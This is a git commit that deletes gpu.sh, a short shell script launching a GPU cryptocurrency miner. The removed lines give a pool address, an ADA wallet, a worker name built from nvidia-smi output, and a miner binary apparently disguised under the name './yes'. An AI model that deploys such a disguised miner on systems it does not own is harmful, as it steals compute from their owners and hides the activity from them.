c2eba8d957d2579bf7dedcd97df94fcdba9c0b8e
Diefky <Diefky@users.noreply.github.com>
2021-08-08 22:19:44 +0700

    Delete gpu.sh

--- gpu.sh
+++
@@ -1,6 +0,0 @@
-POOL=rx.unmineable.com:3333
-WALLET=ADA:DdzFFzCqrhsnb1eVNjT8xX5dWVLpY5DGgdKPCSWukunbUhKyAmfp4E48yLKbGT3o2P8b1v1LXkac8Kzt42oF6hPPjJZPyn72XoC4KJ3X
-GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
-WORKER=$(echo Nvidia_$GPU-$(shuf -i 1-99999 -n 1))
-ALGO=wrkzcoin
-./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
